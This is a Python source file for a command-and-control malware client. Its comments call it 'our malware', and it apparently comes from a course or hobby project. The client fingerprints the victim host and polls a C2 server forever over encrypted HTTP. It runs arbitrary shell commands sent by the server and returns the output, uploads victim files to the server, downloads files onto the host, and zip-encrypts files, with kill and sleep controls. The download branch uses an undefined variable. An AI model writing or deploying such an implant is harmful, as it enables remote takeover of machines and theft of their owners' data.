# Command and Control client Code

from os import chdir, getcwd, getenv, uname, path
from subprocess import run, PIPE, STDOUT
from time import sleep, time
from requests import exceptions, get, post, put
from sys import platform
from encryption import cipher
from settings import FILE_REQUEST, FILE_SEND, PORT, CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADER, ZIP_PASSWORD
from pyzipper import AESZipFile, ZIP_LZMA, WZ_AES

if getenv("OS") == "Windows_NT":
    client = getenv("USERNAME", "") + "@" + getenv("COMPUTERNAME", "") + "@" + str(time())
elif platform == "linux" or platform == "linux2":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
elif platform == "darwin":
    client = getenv("USER", "") + "@" + uname().nodename + "@" + str(time())
else:
    client = "unknown" + "@" + "unknown" + "@" + str(time())

# UTF-8 encode the client first to be able to encrypt it, but then we must decode it after the encyption
encrypted_client = cipher.encrypt(client.encode()).decode()

def post_to_server(message: str, response_path: str = RESPONSE):
    """ Function to encrypt data and then post it to the c2 server. Accepts a message and a response path (optional) as arguments."""
    try:
        # Byte encode the message and then encrypt it before posting
        message = cipher.encrypt(message.encode())
        post(url=f"http://{C2_SERVER}:{PORT}{response_path}", data={RESPONSE_KEY: message}, headers=HEADER, proxies=PROXY)
    except exceptions.RequestException:
        return

def get_third_item(input_string, replace=True):
    """ This is the function that splits a string and returns the 3rd item. Bt default, all forward slashes in the 3rd
    item are changed to backslashes. This can be disabled if replace is set to False during the call. """
    try:
        if replace:
            return input_string.split()[2].replace("\\", "/")
        else:
            return input_string.split()[2]
    except IndexError:
        post_to_server(f"You must enter an argument after {input_string}.\n")

# Try an HTTP GET request to the c2 server and retrive a response; if it fails, keep trying forever
while True:
    try:
        response = get(url=f"http://{C2_SERVER}:{PORT}{CMD_REQUEST}{encrypted_client}", headers=HEADER, proxies=PROXY)
        print(response.status_code)
        # If we get a 404 status code from server, raise an exception
        if response.status_code == 404:
            raise exceptions.RequestException(f"Server {C2_SERVER} returned a 404 status code")
    except exceptions.RequestException:
        sleep(DELAY)
        continue
    
    # Retrieve the command via the decrypted and decoded content ot the response object
    command = cipher.decrypt(response.content).decode()

    # If the command starts with "cd ", sliece out directory and chdir to it
    if command.startswith("cd "):
        directory = command[3:]
        try:
            chdir(directory)
        except FileNotFoundError:
            post_to_server(f"Directory {directory} not found")
        except NotADirectoryError:
            post_to_server(f"Directory {directory} is not a directory")
        except PermissionError:
            post_to_server(f"Permission denied to access directory {directory}")
        except OSError:
            post_to_server(f"Error accessing directory {directory}")
        else:
            post_to_server(getcwd(), CWD_RESPONSE)

    # If command dosen't start with client, run an OS command and send the output to the c2 server
    elif not command.startswith("client "):
        command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
        post_to_server(command_output.decode())

    # The "client download FILENAME" command allows is ti transfer files to the client from our c2 server
    elif command.startswith("client download"):

        # Split out the filepath to download and replace \ with /
        filepath = get_third_item(command)

        # If we had an Index Error, start a new interation of the while loop
        if filepath is None:
            continue

        # UTF-8 encode the filename first to be able to encrypt it, but then we must decode it after the encryption
        encrypted_filepath = cipher.encrypt(filepath.encode()).decode()

        # Use an HTTP GET request to stream the requested file from the c2 server
        try:
            with get(url=f"http://{C2_SERVER}:{PORT}{FILE_REQUEST}{encrypted_filepath}", stream=True, headers=HEADER, proxies=PROXY) as response:

                # If the file was not found, open it up and write it out to disk, then notify us on the server
                if response.status_code == 200:
                    with open(filename, "wb") as file_handle:
                        # Decrypt the response content and write the file out to disk, then notify us on the server
                        file_handle.write(cipher.decrypt(response.content))
                    post_to_server(f"{filename} is now on {client}.\n")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to write {filename} to disk on {client}.\n")

    # The "client upload FILENAME" command allows us to push files from the client to our c2 server
    elif command.startswith("client upload"):
        
        # Split out the filepath to download and replace \ with /
        filepath = get_third_item(command)

        # If we had an Index Error, start a new interation of the while loop
        if filepath is None:
            continue

        # Return the basename of filepath
        filename = path.basename(filepath)

        # Byte encode the filename first to be able to encrypt it, but then we must decode it after the encryption
        encrypted_filename = cipher.encrypt(filename.encode()).decode()

        # Read the file in and use it as the data argument for an HTTP PUT request to our c2 server
        try:
            with open(filepath, "rb") as file_handle:
                encrypted_file = cipher.encrypt(file_handle.read())
                put(f"http://{C2_SERVER}:{PORT}{FILE_SEND}/{encrypted_filename}", data=encrypted_file, stream=True, proxies=PROXY, headers=HEADER)
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on {client}.\n")

    # The "client zip FILENAME" command allows us to zip-encrypt files on the client
    elif command.startswith("client zip"):

        # Split out the filepath to download and replace \ with /
        filepath = get_third_item(command)

        # If we had an Index Error, start a new interation of the while loop
        if filepath is None:
            continue

        # Return the basename of filepath
        filename = path.basename(filepath)

        # Zip file using AES encryption and LZMA compression method
        try:
            with AESZipFile(f"{filepath}.zip", "w", compression=ZIP_LZMA, encryption=WZ_AES) as zip_file:
                zip_file.setpassword(ZIP_PASSWORD)

                # We only have functionality to zip-encrypt files, no directories yet
                if path.isdir(filepath):
                    post_to_server(f"{filepath} on {client} is a directory. Only files can be zipped.\n")
                else:
                    zip_file.write(filepath, filename)
                    post_to_server(f"{filepath} in now zip-encrypted on {client}.\n")
        except IndexError:
            post_to_server("You must enter the filepath to zip.")
        except (FileNotFoundError, PermissionError, OSError):
            post_to_server(f"Unable to access {filepath} on client.\n")
                    
    # The "client kill" command will shut down our malware; make sure we have persistance!
    elif command.startswith("client kill"):
        post_to_server(f"{client} has been killed.\n")
        exit()

    # The "client sleep SECONDS" command will silence our malware for a set amount of time
    elif command.startswith("client sleep "):
        try:
            delay = float(command.split()[2])
            if delay < 0:
                raise ValueError
        except (IndexError, ValueError):
            post_to_server("You must enter in a positive number for the amount of time to sleep in second.\n")
        else:
            post_to_server(f"{client} will sleep for {delay} seconds.\n")
            sleep(delay)
            post_to_server(f"{client} is now awake.\n")